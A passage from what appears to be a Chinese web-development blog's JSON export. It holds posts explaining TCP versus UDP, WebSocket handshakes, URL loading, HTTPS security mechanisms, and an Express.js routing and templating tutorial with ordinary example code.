报头大小\nTCP头大。一个TCP数据包报头的大小是20字节。TCP报头中包含序列号，ACK号，数据偏移量，保留，控制位，窗口，紧急指针，可选项，填充项，校验位，源端口和目的端口。\nUDP头小。UDP数据报报头是8个字节。而UDP报头只包含长度，源端口号，目的端口，和校验和。\n\n8. 拥塞或流控制\nTCP有流量控制。在任何用户数据可以被发送之前，TCP需要三数据包来设置一个套接字连接。TCP处理的可靠性和拥塞控制。\nUDP不能进行流量控制。\n\n9. 应用\n由于TCP提供可靠交付和有序性的保证，它是最适合需要高可靠并且对传输时间要求不高的应用。\nUDP是更适合的应用程序需要快速，高效的传输的应用，如游戏。\nUDP是无状态的性质，在服务器端需要对大量客户端产生的少量请求进行应答的应用中是非常有用的。\n在实践中，TCP被用于金融领域，如FIX协议是一种基于TCP的协议，而UDP是大量使用在游戏和娱乐场所。\n\n10.上层使用的协议\n基于TCP协议的：Telnet，FTP以及SMTP协议。\n基于UDP协议的：DHCP、DNS、SNMP、TFTP、BOOTP。\n\n\n一、UDPUDP（User Datagram Protocol），用户数据包协议，是一个简单的面向数据报的通信协议，即对应用层交下来的报文，不合并，不拆分，只是在其上面加上首部后就交给了下面的网络层\n也就是说无论应用层交给UDP多长的报文，它统统发送，一次发送一个报文\n而对接收方，接到后直接去除首部，交给上面的应用层就完成任务\nUDP报头包括4个字段，每个字段占用2个字节（即16个二进制位），标题短，开销小\n\n特点如下：\n\nUDP 不提供复杂的控制机制，利用 IP 提供面向无连接的通信服务\n传输途中出现丢包，UDP 也不负责重发\n当包的到达顺序出现乱序时，UDP没有纠正的功能。\n并且它是将应用程序发来的数据在收到的那一刻，立即按照原样发送到网络上的一种机制。即使是出现网络拥堵的情况，UDP 也无法进行流量控制等避免网络拥塞行为\n\n二、TCPTCP（Transmission Control Protocol），传输控制协议，是一种可靠、面向字节流的通信协议，把上面应用层交下来的数据看成无结构的字节流来发送\n可以想象成流水形式的，发送方TCP会将数据放入“蓄水池”（缓存区），等到可以发送的时候就发送，不能发送就等着，TCP会根据当前网络的拥塞状态来确定每个报文段的大小\nTCP报文首部有20个字节，额外开销大\n\n特点如下：\n\nTCP充分地实现了数据传输时各种控制功能，可以进行丢包时的重发控制，还可以对次序乱掉的分包进行顺序控制。而这些在 UDP 中都没有。\n此外，TCP 作为一种面向有连接的协议，只有在确认通信对端存在时才会发送数据，从而可以控制通信流量的浪费。\n根据 TCP 的这些机制，在 IP 这种无连接的网络上也能够实现高可靠性的通信（ 主要通过检验和、序列号、确认应答、重发控制、连接管理以及窗口控制等机制实现）\n\n三、区别UDP与TCP两者的都位于传输层，如下图所示：\n\n两者区别如下表所示：\n\n\n\n\nTCP\nUDP\n\n\n\n可靠性\n可靠\n不可靠\n\n\n连接性\n面向连接\n无连接\n\n\n报文\n面向字节流\n面向报文\n\n\n效率\n传输效率低\n传输效率高\n\n\n双共性\n全双工\n一对一、一对多、多对一、多对多\n\n\n流量控制\n滑动窗口\n无\n\n\n拥塞控制\n慢开始、拥塞避免、快重传、快恢复\n无\n\n\n传输效率\n慢\n快\n\n\n\nTCP 是面向连接的协议，建立连接3次握手、断开连接四次挥手，UDP是面向无连接，数据传输前后不连接连接，发送端只负责将数据发送到网络，接收端从消息队列读取\nTCP 提供可靠的服务，传输过程采用流量控制、编号与确认、计时器等手段确保数据无差错，不丢失。UDP 则尽可能传递数据，但不保证传递交付给对方\nTCP 面向字节流，将应用层报文看成一串无结构的字节流，分解为多个TCP报文段传输后，在目的站重新装配。UDP协议面向报文，不拆分应用层报文，只保留报文边界，一次发送一个报文，接收方去除报文首部后，原封不动将报文交给上层应用\nTCP 只能点对点全双工通信。UDP 支持一对一、一对多、多对一和多对多的交互通信\n\n两者应用场景如下图：\n\n可以看到，TCP 应用场景适用于对效率要求低，对准确性要求高或者要求有链接的场景，而UDP 适用场景为对效率要求高，对准确性要求低的场景\n","categories":["http"],"tags":["http"]},{"title":"WebSocket","url":"/2018/05/20/http/WebSocket/","content":"一、是什么WebSocket，是一种网络传输协议，位于OSI模型的应用层。可在单个TCP连接上进行全双工通信，能更好的节省服务器资源和带宽并达到实时通迅\n客户端和服务器只需要完成一次握手，两者之间就可以创建持久性的连接，并进行双向数据传输\n\n从上图可见，websocket服务器与客户端通过握手连接，连接成功后，两者都能主动的向对方发送或接受数据\n而在websocket出现之前，开发实时web应用的方式为轮询\n不停地向服务器发送 HTTP 请求，问有没有数据，有数据的话服务器就用响应报文回应。如果轮询的频率比较高，那么就可以近似地实现“实时通信”的效果\n轮询的缺点也很明显，反复发送无效查询请求耗费了大量的带宽和 CPU资源\n二、特点全双工通信允许数据在两个方向上同时传输，它在能力上相当于两个单工通信方式的结合\n例如指 A→B 的同时 B→A ，是瞬时同步的\n二进制帧采用了二进制帧结构，语法、语义与 HTTP 完全不兼容，相比http/2，WebSocket更侧重于“实时通信”，而HTTP/2 更侧重于提高传输效率，所以两者的帧结构也有很大的区别\n不像 HTTP/2 那样定义流，也就不存在多路复用、优先级等特性\n自身就是全双工，也不需要服务器推送\n协议名引入ws和wss分别代表明文和密文的websocket协议，且默认端口使用80或443，几乎与http一致\nws://www.chrono.comws://www.chrono.com:8080/srvwss://www.chrono.com:445/im?user_id=xxx\n\n握手WebSocket也要有一个握手过程，然后才能正式收发数据\n客户端发送数据格式如下：\nGET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==Origin: http://example.comSec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13\n\n\nConnection：必须设置Upgrade，表示客户端希望连接升级\nUpgrade：必须设置Websocket，表示希望升级到Websocket协议\nSec-WebSocket-Key：客户端发送的一个 base64 编码的密文，用于简单的认证秘钥。要求服务端必须返回一个对应加密的“Sec-WebSocket-Accept应答，否则客户端会抛出错误，并关闭连接\nSec-WebSocket-Version ：表示支持的Websocket版本\n\n服务端返回的数据格式：\nHTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=Sec-WebSocket-Protocol: chat\n\n\nHTTP&#x2F;1.1 101 Switching Protocols：表示服务端接受 WebSocket 协议的客户端连接\nSec-WebSocket-Accep：验证客户端请求报文，同样也是为了防止误连接。具体做法是把请求头里“Sec-WebSocket-Key”的值，加上一个专用的 UUID，再计算摘要\n\n优点\n较少的控制开销：数据包头部协议较小，不同于http每次请求需要携带完整的头部\n更强的实时性：相对于HTTP请求需要等待客户端发起请求服务端才能响应，延迟明显更少\n保持创连接状态：创建通信后，可省略状态信息，不同于HTTP每次请求需要携带身份验证\n更好的二进制支持：定义了二进制帧，更好处理二进制内容\n支持扩展：用户可以扩展websocket协议、实现部分自定义的子协议\n更好的压缩效果：Websocket在适当的扩展支持下，可以沿用之前内容的上下文，在传递类似的数据时，可以显著地提高压缩率\n\n二、应用场景基于websocket的事实通信的特点，其存在的应用场景大概有：\n\n弹幕\n媒体聊天\n协同编辑\n基于位置的应用\n体育实况更新\n股票基金报价实时更新\n\n","categories":["http"],"tags":["http"]},{"title":"地址栏输入 URL 敲下回车后发生了什么","url":"/2018/05/23/http/%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5%20URL%20%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/","content":"一、简单分析简单的分析，从输入 URL到回车后发生的行为如下：\n\nURL解析\nDNS 查询\nTCP 连接\nHTTP 请求\n响应请求\n页面渲染\n\n二、详细分析URL解析首先判断你输入的是一个合法的URL 还是一个待搜索的关键词，并且根据你输入的内容进行对应操作\nURL的解析第过程中的第一步，一个url的结构解析如下：\n\nDNS查询在之前文章中讲过DNS的查询，这里就不再讲述了\n整个查询过程如下图所示：\n\n最终，获取到了域名对应的目标服务器IP地址\nTCP连接在之前文章中，了解到tcp是一种面向有连接的传输层协议\n在确定目标服务器服务器的IP地址后，则经历三次握手建立TCP连接，流程如下：\n\n发送 http 请求当建立tcp连接之后，就可以在这基础上进行通信，浏览器发送 http 请求到目标服务器\n请求的内容包括：\n\n请求行\n请求头\n请求主体\n\n\n响应请求当服务器接收到浏览器的请求之后，就会进行逻辑操作，处理完成之后返回一个HTTP响应消息，包括：\n\n状态行\n响应头\n响应正文\n\n\n在服务器响应之后，由于现在http默认开始长连接keep-alive，当页面关闭之后，tcp链接则会经过四次挥手完成断开\n页面渲染当浏览器接收到服务器响应的资源后，首先会对资源进行解析：\n\n查看响应头的信息，根据不同的指示做对应处理，比如重定向，存储cookie，解压gzip，缓存资源等等\n查看响应头的 Content-Type的值，根据不同的资源类型采用不同的解析方式\n\n关于页面的渲染过程如下：\n\n解析HTML，构建 DOM 树\n解析 CSS ，生成 CSS 规则树\n合并 DOM 树和 CSS 规则，生成 render 树\n布局 render 树（ Layout &#x2F; reflow ），负责各元素尺寸、位置的计算\n绘制 render 树（ paint ），绘制页面像素信息\n浏览器会将各层的信息发送给 GPU，GPU 会将各层合成（ composite ），显示在屏幕上\n\n\n","categories":["http"],"tags":["http"]},{"title":"https的安全性","url":"/2018/05/06/http/https%E7%9A%84%E5%AE%89%E5%85%A8%E8%A1%A8%E7%8E%B0%E5%93%AA%E9%87%8C/","content":"一、安全特性在上篇文章中，我们了解到HTTP在通信过程中，存在以下问题：\n\n通信使用明文（不加密），内容可能被窃听\n不验证通信方的身份，因此有可能遭遇伪装\n\n而HTTPS的出现正是解决这些问题，HTTPS是建立在SSL之上，其安全性由SSL来保证\n在采用SSL后，HTTP就拥有了HTTPS的加密、证书和完整性保护这些功能\n\nSSL(Secure Sockets Layer 安全套接字协议),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议\n\n\n二、如何做SSL的实现这些功能主要依赖于三种手段：\n\n对称加密：采用协商的密钥对数据加密\n非对称加密：实现身份认证和密钥协商\n摘要算法：验证信息的完整性\n数字签名：身份验证\n\n对称加密对称加密指的是加密和解密使用的秘钥都是同一个，是对称的。只要保证了密钥的安全，那整个通信过程就可以说具有了机密性\n\n非对称加密非对称加密，存在两个秘钥，一个叫公钥，一个叫私钥。两个秘钥是不同的，公钥可以公开给任何人使用，私钥则需要保密\n公钥和私钥都可以用来加密解密，但公钥加密后只能用私钥解 密，反过来，私钥加密后也只能用公钥解密\n\n混合加密在HTTPS通信过程中，采用的是对称加密+非对称加密，也就是混合加密\n在对称加密中讲到，如果能够保证了密钥的安全，那整个通信过程就可以说具有了机密性\n而HTTPS采用非对称加密解决秘钥交换的问题\n具体做法是发送密文的一方使用对方的公钥进行加密处理“对称的密钥”，然后对方用自己的私钥解密拿到“对称的密钥”\n\n这样可以确保交换的密钥是安全的前提下，使用对称加密方式进行通信\n举个例子：网站秘密保管私钥，在网上任意分发公钥，你想要登录网站只要用公钥加密就行了，密文只能由私钥持有者才能解密。而黑客因为没有私钥，所以就无法破解密文\n上述的方法解决了数据加密，在网络传输过程中，数据有可能被篡改，并且黑客可以伪造身份发布公钥，如果你获取到假的公钥，那么混合加密也并无多大用处，你的数据扔被黑客解决\n因此，在上述加密的基础上仍需加上完整性、身份验证的特性，来实现真正的安全，实现这一功能则是摘要算法\n摘要算法实现完整性的手段主要是摘要算法，也就是常说的散列函数、哈希函数\n可以理解成一种特殊的压缩算法，它能够把任意长度的数据“压缩”成固定长度、而且独一无二的“摘要”字符串，就好像是给这段数据生成了一个数字“指纹”\n\n摘要算法保证了“数字摘要”和原文是完全等价的。所以，我们只要在原文后附上它的摘要，就能够保证数据的完整性\n比如，你发了条消息：“转账 1000 元”，然后再加上一个 SHA-2 的摘要。网站收到后也计算一下消息的摘要，把这两份“指纹”做个对比，如果一致，就说明消息是完整可信的，没有被修改\n\n数字签名数字签名能确定消息确实是由发送方签名并发出来的，因为别人假冒不了发送方的签名\n原理其实很简单，就是用私钥加密，公钥解密\n签名和公钥一样完全公开，任何人都可以获取。但这个签名只有用私钥对应的公钥才能解开，拿到摘要后，再比对原文验证完整性，就可以像签署文件一样证明消息确实是你发的\n\n和消息本身一样，因为谁都可以发布公钥，我们还缺少防止黑客伪造公钥的手段，也就是说，怎么判断这个公钥就是你的公钥\n这时候就需要一个第三方，就是证书验证机构\nCA验证机构数字证书认证机构处于客户端与服务器双方都可信赖的第三方机构的立场\nCA 对公钥的签名认证要求包括序列号、用途、颁发者、有效时间等等，把这些打成一个包再签名，完整地证明公钥关联的各种信息，形成“数字证书”\n流程如下图：\n\n\n服务器的运营人员向数字证书认证机构提出公开密钥的申请\n数字证书认证机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名\n然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起\n服务器会将这份由数字证书认证机构颁发的数字证书发送给客户端，以进行非对称加密方式通信\n\n接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书上的数字签名进行验证，一旦验证通过，则证明：\n\n认证服务器的公开密钥的是真实有效的数字证书认证机构\n服务器的公开密钥是值得信赖的\n\n三、总结可以看到，HTTPS与HTTP虽然只差一个SSL，但是通信安全得到了大大的保障，通信的四大特性都以解决，解决方式如下：\n\n机密性：混合算法\n完整性：摘要算法\n身份认证：数字签名\n不可否定：数字签名\n\n同时引入第三方证书机构，确保公开秘钥的安全性\n","categories":["http"],"tags":["http"]},{"title":"node-express框架总结","url":"/2019/06/07/nodejs/express/","content":"一、概述\n官网 http://expressjs.com/zh-cn/\n\n\nExpress是目前最流行的基于Node.js的Web开发框架，可以快速地搭建一个完整功能的网站\n\n环境搭建\n\nhttp://www.expressjs.com.cn/starter/generator.html\n\n\n通过应用生成器工具 express-generator可以快速创建一个应用的骨架\n\n$ npm install express-generator -g\n\n二、运行原理底层：http模块\n\nExpress框架建立在node.js内置的http模块上。http模块生成服务器的原始代码如下\n\nvar http = require(&quot;http&quot;);var app = http.createServer(function(request, response) &#123;  response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;);  response.end(&quot;Hello world!&quot;);&#125;);app.listen(3000, &quot;localhost&quot;);\n\n\nExpress框架的核心是对http模块的再包装。上面的代码用Express改写如下\n\nvar express = require(&#x27;express&#x27;);var app = express();app.get(&#x27;/&#x27;, function (req, res) &#123;  res.send(&#x27;Hello world!&#x27;);&#125;);app.listen(3000);\n\n\nExpress框架等于在http模块之上，加了一个中间层\n\n什么是中间件\n\n\n简单说，中间件（middleware）就是处理HTTP请求的函数。它最大的特点就是，一个中间件处理完，再传递给下一个中间件。App实例在运行过程中，会调用一系列的中间件\n每个中间件可以从App实例，接收三个参数，依次为request对象（代表HTTP请求）、response对象（代表HTTP回应），next回调函数（代表下一个中间件）。每个中间件都可以对HTTP请求（request对象）进行加工，并且决定是否调用next方法，将request对象再传给下一个中间件。\n\n\n\n一个不进行任何操作、只传递request对象的中间件，就是下面这样\n\nfunction uselessMiddleware(req, res, next) &#123;  next();&#125;\n\n\n上面代码的next就是下一个中间件。如果它带有参数，则代表抛出一个错误，参数为错误文本\n抛出错误以后，后面的中间件将不再执行，直到发现一个错误处理函数为止\n\nfunction uselessMiddleware(req, res, next) &#123;  next(&#x27;出错了！&#x27;);&#125;\n\n三、use方法\nuse是express注册中间件的方法，它返回一个函数。下面是一个连续调用两个中间件的例子\n\nvar express = require(&quot;express&quot;);var http = require(&quot;http&quot;);var app = express();app.use(function(request, response, next) &#123;  console.log(&quot;In comes a &quot; + request.method + &quot; to &quot; + request.url);  next();&#125;);app.use(function(request, response) &#123;  response.writeHead(200, &#123; &quot;Content-Type&quot;: &quot;text/plain&quot; &#125;);  response.end(&quot;Hello world!\\n&quot;);&#125;);http.createServer(app).listen(1337);\n\n\n上面代码使用app.use方法，注册了两个中间件。收到HTTP请求后，先调用第一个中间件，在控制台输出一行信息，然后通过next方法，将执行权传给第二个中间件，输出HTTP回应。由于第二个中间件没有调用next方法，所以request对象就不再向后传递了\n\n\nuse方法内部可以对访问路径进行判断，据此就能实现简单的路由，根据不同的请求网址，返回不同的网页内容\n\nvar express = require(&quot;express&quot;);var http = require(&quot;http&quot;);var app = express();app.use(function(request, response, next) &#123;  if (request.url == &quot;/&quot;) &#123;    response.writeHead(200, &#123; &quot;Content-Type&quot;: &quot;text/plain&quot; &#125;);    response.end(&quot;Welcome to the homepage!\\n&quot;);  &#125; else &#123;    next();  &#125;&#125;);app.use(function(request, response, next) &#123;  if (request.url == &quot;/about&quot;) &#123;    response.writeHead(200, &#123; &quot;Content-Type&quot;: &quot;text/plain&quot; &#125;);  &#125; else &#123;    next();  &#125;&#125;);app.use(function(request, response) &#123;  response.writeHead(404, &#123; &quot;Content-Type&quot;: &quot;text/plain&quot; &#125;);  response.end(&quot;404 error!\\n&quot;);&#125;);http.createServer(app).listen(1337);\n\n\n上面代码通过request.url属性，判断请求的网址，从而返回不同的内容。注意，app.use方法一共登记了三个中间件，只要请求路径匹配，就不会将执行权交给下一个中间件。因此，最后一个中间件会返回404错误，即前面的中间件都没匹配请求路径，找不到所要请求的资源\n\n\n除了在回调函数内部判断请求的网址，use方法也允许将请求网址写在第一个参数。这代表，只有请求路径匹配这个参数，后面的中间件才会生效。无疑，这样写更加清晰和方便\n\n// 只对根目录的请求，调用某个中间件app.use(&#x27;/path&#x27;, someMiddleware);\n\n\n因此，上面的代码可以写成下面的样子\n\nar express = require(&quot;express&quot;);var http = require(&quot;http&quot;);var app = express();app.use(&quot;/home&quot;, function(request, response, next) &#123;  response.writeHead(200, &#123; &quot;Content-Type&quot;: &quot;text/plain&quot; &#125;);  response.end(&quot;Welcome to the homepage!\\n&quot;);&#125;);app.use(&quot;/about&quot;, function(request, response, next) &#123;  response.writeHead(200, &#123; &quot;Content-Type&quot;: &quot;text/plain&quot; &#125;);  response.end(&quot;Welcome to the about page!\\n&quot;);&#125;);app.use(function(request, response) &#123;  response.writeHead(404, &#123; &quot;Content-Type&quot;: &quot;text/plain&quot; &#125;);  response.end(&quot;404 error!\\n&quot;);&#125;);http.createServer(app).listen(1337)\n\n四、Express的方法all方法和HTTP动词方法\n\n针对不同的请求，Express提供了use方法的一些别名。比如，上面代码也可以用别名的形式来写\n\nvar express = require(&quot;express&quot;);var http = require(&quot;http&quot;);var app = express();app.all(&quot;*&quot;, function(request, response, next) &#123;  response.writeHead(200, &#123; &quot;Content-Type&quot;: &quot;text/plain&quot; &#125;);  next();&#125;);app.get(&quot;/&quot;, function(request, response) &#123;  response.end(&quot;Welcome to the homepage!&quot;);&#125;);app.get(&quot;/about&quot;, function(request, response) &#123;  response.end(&quot;Welcome to the about page!&quot;);&#125;);app.get(&quot;*&quot;, function(request, response) &#123;  response.end(&quot;404!&quot;);&#125;);http.createServer(app).listen(1337);\n\n\n\n上面代码的all方法表示，所有请求都必须通过该中间件，参数中的“*”表示对所有路径有效。get方法则是只有GET动词的HTTP请求通过该中间件，它的第一个参数是请求的路径。由于get方法的回调函数没有调用next方法，所以只要有一个中间件被调用了，后面的中间件就不会再被调用了\n除了get方法以外，Express还提供post、put、delete方法，即HTTP动词都是Express的方法\n\n\n\n除了get方法以外，Express还提供post、put、delete方法，即HTTP动词都是Express的方法\n这些方法的第一个参数，都是请求的路径。除了绝对匹配以外，Express允许模式匹配\n\napp.get(&quot;/hello/:who&quot;, function(req, res) &#123;  res.end(&quot;Hello, &quot; + req.params.who + &quot;.&quot;);&#125;);\n\n五、set方法\nset方法用于指定变量的值\n\n\n使用set方法，为系统变量“views”和“view engine”指定值\napp.set(&quot;views&quot;, __dirname + &quot;/views&quot;);app.set(&quot;view engine&quot;, &quot;jade&quot;);\n\n六、response对象（1）response.redirect方法\n\nresponse.redirect方法允许网址的重定向\n\nresponse.redirect(&quot;/hello/anime&quot;);response.redirect(&quot;http://www.example.com&quot;);response.redirect(301, &quot;http://www.example.com&quot;);\n\n（2）response.sendFile方法\n\nresponse.sendFile方法用于发送文件\n\nresponse.sendFile(&quot;/path/to/anime.mp4&quot;);\n\n（3）response.render方法\n\nresponse.render方法用于渲染网页模板。\n\n//  使用render方法，将message变量传入index模板，渲染成HTML网页app.get(&quot;/&quot;, function(request, response) &#123;  response.render(&quot;index&quot;, &#123; message: &quot;Hello World&quot; &#125;);&#125;);\n\n七、requst对象（1）request.ip\n\nrequest.ip属性用于获得HTTP请求的IP地址\n\n（2）request.files\n\nrequest.files用于获取上传的文件\n\n八、搭建HTTPs服务器\n使用Express搭建HTTPs加密服务器，也很简单\n\nvar fs = require(&#x27;fs&#x27;);var options = &#123;  key: fs.readFileSync(&#x27;E:/ssl/myserver.key&#x27;),  cert: fs.readFileSync(&#x27;E:/ssl/myserver.crt&#x27;),  passphrase: &#x27;1234&#x27;&#125;;var https = require(&#x27;https&#x27;);var express = require(&#x27;express&#x27;);var app = express();app.get(&#x27;/&#x27;, function(req, res)&#123;  res.send(&#x27;Hello World Expressjs&#x27;);&#125;);var server = https.createServer(options, app);server.listen(8084);console.log(&#x27;Server is running on port 8084&#x27;);\n\n九、静态网页模板\n\n在项目目录之中，建立一个子目录views，用于存放网页模板\n假定这个项目有三个路径：根路径（&#x2F;）、自我介绍（&#x2F;about）和文章（&#x2F;article）。那么，app.js可以这样写\n\n\n// 向服务器发送信息的方法，从send变成了sendfile，后者专门用于发送文件var express = require(&#x27;express&#x27;);var app = express(); app.get(&#x27;/&#x27;, function(req, res) &#123;   res.sendfile(&#x27;./views/index.html&#x27;);&#125;); app.get(&#x27;/about&#x27;, function(req, res) &#123;   res.sendfile(&#x27;./views/about.html&#x27;);&#125;); app.get(&#x27;/article&#x27;, function(req, res) &#123;   res.sendfile(&#x27;./views/article.html&#x27;);&#125;); app.listen(3000);\n\n十、动态网页模板安装模板引擎\n\nExpress支持多种模板引擎，这里采用Handlebars模板引擎的服务器端版本hbs模板引擎\n\nnpm install hbs --save-dev\n\n\n安装模板引擎之后，就要改写app.js\n\n// app.js文件var express = require(&#x27;express&#x27;);var app = express();// 加载hbs模块var hbs = require(&#x27;hbs&#x27;);// 指定模板文件的后缀名为htmlapp.set(&#x27;view engine&#x27;, &#x27;html&#x27;);// 运行hbs模块app.engine(&#x27;html&#x27;, hbs.__express);app.get(&#x27;/&#x27;, function (req, res)&#123;\tres.render(&#x27;index&#x27;);&#125;);app.get(&#x27;/about&#x27;, function(req, res) &#123;\tres.render(&#x27;about&#x27;);&#125;);app.get(&#x27;/article&#x27;, function(req, res) &#123;\tres.render(&#x27;article&#x27;);&#125;);\n\n\n上面代码改用render方法，对网页模板进行渲染。render方法的参数就是模板的文件名，默认放在子目录views之中，后缀名已经在前面指定为html，这里可以省略。所以，res.render(‘index’) 就是指，把子目录views下面的index.html文件，交给模板引擎hbs渲染\n\n十一、新建数据脚本\n\n渲染是指将数据代入模板的过程。实际运用中，数据都是保存在数据库之中的，这里为了简化问题，假定数据保存在一个脚本文件中\n在项目目录中，新建一个文件blog.js，用于存放数据。blog.js的写法符合CommonJS规范，使得它可以被require语句加载\n\n\n// blog.js文件var entries = [\t&#123;&quot;id&quot;:1, &quot;title&quot;:&quot;第一篇&quot;, &quot;body&quot;:&quot;正文&quot;, &quot;published&quot;:&quot;6/2/2013&quot;&#125;,\t&#123;&quot;id&quot;:2, &quot;title&quot;:&quot;第二篇&quot;, &quot;body&quot;:&quot;正文&quot;, &quot;published&quot;:&quot;6/3/2013&quot;&#125;,\t&#123;&quot;id&quot;:3, &quot;title&quot;:&quot;第三篇&quot;, &quot;body&quot;:&quot;正文&quot;, &quot;published&quot;:&quot;6/4/2013&quot;&#125;,\t&#123;&quot;id&quot;:4, &quot;title&quot;:&quot;第四篇&quot;, &quot;body&quot;:&quot;正文&quot;, &quot;published&quot;:&quot;6/5/2013&quot;&#125;,\t&#123;&quot;id&quot;:5, &quot;title&quot;:&quot;第五篇&quot;, &quot;body&quot;:&quot;正文&quot;, &quot;published&quot;:&quot;6/10/2013&quot;&#125;,\t&#123;&quot;id&quot;:6, &quot;title&quot;:&quot;第六篇&quot;, &quot;body&quot;:&quot;正文&quot;, &quot;published&quot;:&quot;6/12/2013&quot;&#125;];exports.getBlogEntries = function ()&#123;   return entries;&#125; exports.getBlogEntry = function (id)&#123;   for(var i=0; i &lt; entries.length; i++)&#123;      if(entries[i].id == id) return entries[i];   &#125;&#125;\n\n十二、新建网页模板\n接着，新建模板文件index.html\n\n&lt;!-- views/index.html文件 --&gt;&lt;h1&gt;文章列表&lt;/h1&gt; &#123;&#123;#each entries&#125;&#125;   &lt;p&gt;      &lt;a href=&quot;/article/&#123;&#123;id&#125;&#125;&quot;&gt;&#123;&#123;title&#125;&#125;&lt;/a&gt;&lt;br/&gt;      Published: &#123;&#123;published&#125;&#125;   &lt;/p&gt;&#123;&#123;/each&#125;&#125;&lt;!-- views/about.html文件 --&gt;&lt;h1&gt;自我介绍&lt;/h1&gt; &lt;p&gt;正文&lt;/p&gt;&lt;!-- views/article.html文件 --&gt;&lt;h1&gt;&#123;&#123;blog.title&#125;&#125;&lt;/h1&gt;Published: &#123;&#123;blog.published&#125;&#125; &lt;p/&gt; &#123;&#123;blog.body&#125;&#125;\n\n\n可以看到，上面三个模板文件都只有网页主体。因为网页布局是共享的，所以布局的部分可以单独新建一个文件layout.html\n\n&lt;!-- views/layout.html文件 --&gt;&lt;html&gt; &lt;head&gt;   &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt;&lt;/head&gt; &lt;body&gt; \t&#123;&#123;&#123;body&#125;&#125;&#125;    &lt;footer&gt;      &lt;p&gt;         &lt;a href=&quot;/&quot;&gt;首页&lt;/a&gt; - &lt;a href=&quot;/about&quot;&gt;自我介绍&lt;/a&gt;      &lt;/p&gt;   &lt;/footer&gt;    &lt;/body&gt;&lt;/html&gt;\n\n十三、渲染模板\n最后，改写app.js文件\n\n// app.js文件var express = require(&#x27;express&#x27;);var app = express(); var hbs = require(&#x27;hbs&#x27;);// 加载数据模块var blogEngine = require(&#x27;./blog&#x27;); app.set(&#x27;view engine&#x27;, &#x27;html&#x27;);app.engine(&#x27;html&#x27;, hbs.__express);app.use(express.bodyParser()); app.get(&#x27;/&#x27;, function(req, res) &#123;   res.render(&#x27;index&#x27;,&#123;title:&quot;最近文章&quot;, entries:blogEngine.getBlogEntries()&#125;);&#125;); app.get(&#x27;/about&#x27;, function(req, res) &#123;   res.render(&#x27;about&#x27;, &#123;title:&quot;自我介绍&quot;&#125;);&#125;); app.get(&#x27;/article/:id&#x27;, function(req, res) &#123;   var entry = blogEngine.getBlogEntry(req.params.id);   res.render(&#x27;article&#x27;,&#123;title:entry.title, blog:entry&#125;);&#125;); app.listen(3000);\n\n\n上面代码中的render方法，现在加入了第二个参数，表示模板变量绑定的数据\n\n十四、指定静态文件目录\n模板文件默认存放在views子目录。这时，如果要在网页中加载静态文件（比如样式表、图片等），就需要另外指定一个存放静态文件的目录\n\napp.use(express.static(&#x27;public&#x27;));\n\n\n上面代码在文件app.js之中，指定静态文件存放的目录是public。于是，当浏览器发出非HTML文件请求时，服务器端就到public目录寻找这个文件。比如，浏览器发出如下的样式表请求：\n\n&lt;link href=&quot;/bootstrap/css/bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;\n\n\n服务器端就到public/bootstrap/css/目录中寻找bootstrap.css文件\n\n十五、Express.Router用法\n从Express 4.0开始，路由器功能成了一个单独的组件Express.Router。它好像小型的express应用程序一样，有自己的use、get、param和route方法\n\n基本用法\n\n首先，Express.Router是一个构造函数，调用后返回一个路由器实例。然后，使用该实例的HTTP动词方法，为不同的访问路径，指定回调函数；最后，挂载到某个路径。\n\nvar router = express.Router();router.get(&#x27;/&#x27;, function(req, res) &#123;  res.send(&#x27;首页&#x27;);&#125;);router.get(&#x27;/about&#x27;, function(req, res) &#123;  res.send(&#x27;关于&#x27;);&#125;);app.use(&#x27;/&#x27;, router);\n\n\n\n上面代码先定义了两个访问路径，然后将它们挂载到根目录\n这种路由器可以自由挂载的做法，为程序带来了更大的灵活性，既可以定义多个路由器实例，也可以为将同一个路由器实例挂载到多个路径。\n\n\n十六、router.route方法\nrouter实例对象的route方法，可以接受访问路径作为参数\n\nvar router = express.Router();router.route(&#x27;/api&#x27;)\t.post(function(req, res) &#123;\t\t// ...\t&#125;)\t.get(function(req, res) &#123;\t\tBear.find(function(err, bears) &#123;\t\t\tif (err) res.send(err);\t\t\tres.json(bears);\t\t&#125;);\t&#125;);app.use(&#x27;/&#x27;, router);\n\n十七、router中间件\nuse方法为router对象指定中间件，即在数据正式发给用户之前，对数据进行处理。下面就是一个中间件的例子\n\nrouter.use(function(req, res, next) &#123;\tconsole.log(req.method, req.url);\tnext();\t&#125;);\n\n\n上面代码中，回调函数的next参数，表示接受其他中间件的调用。函数体中的next()，表示将数据传递给下一个中间件\n注意，中间件的放置顺序很重要，等同于执行顺序。而且，中间件必须放在HTTP动词方法之前，否则不会执行\n\n十八、对路径参数的处理\nrouter对象的param方法用于路径参数的处理，可以\n\nrouter.param(&#x27;name&#x27;, function(req, res, next, name) &#123;\t// 对name进行验证或其他处理……\tconsole.log(name);\treq.name = name;\tnext();\t&#125;);router.get(&#x27;/hello/:name&#x27;, function(req, res) &#123;\tres.send(&#x27;hello &#x27; + req.name + &#x27;!&#x27;);&#125;);\n\n\n上面代码中，get方法为访问路径指定了name参数，param方法则是对name参数进行处理。注意，param方法必须放在HTTP动词方法之前\n\n十九、app.route\n\n假定app是Express的实例对象，Express 4.0为该对象提供了一个route属性。app.route实际上是express.Router()的缩写形式，直接挂载到根路径\n因此，对同一个路径指定get和post方法的回调函数，可以写成链式形式\n\n\napp.route(&#x27;/login&#x27;)\t.get(function(req, res) &#123;\t\tres.send(&#x27;this is the login form&#x27;);\t&#125;)\t.post(function(req, res) 